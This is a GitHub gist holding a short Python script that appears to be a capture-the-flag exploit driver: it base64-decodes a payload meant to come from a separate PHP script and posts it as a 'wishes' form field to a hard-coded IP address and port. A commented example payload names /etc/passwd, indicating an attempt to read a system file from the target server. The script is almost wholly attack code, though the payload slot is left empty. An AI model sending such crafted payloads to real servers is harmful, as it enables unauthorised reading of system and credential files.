#date: 2021-12-27T17:09:31Z
#url: https://api.github.com/gists/7b006c68704fe60786c5a2786a3f61e9
#owner: https://api.github.com/users/parrot409

#!/usr/bin/env python3
import base64
import requests

# PUT PHP output here
a = base64.b64decode(b'')
# a = b'{"/etc/passwd":""}'
r = requests.post('http://124.70.201.145:7777/',data={"wishes":a})
print(r.text)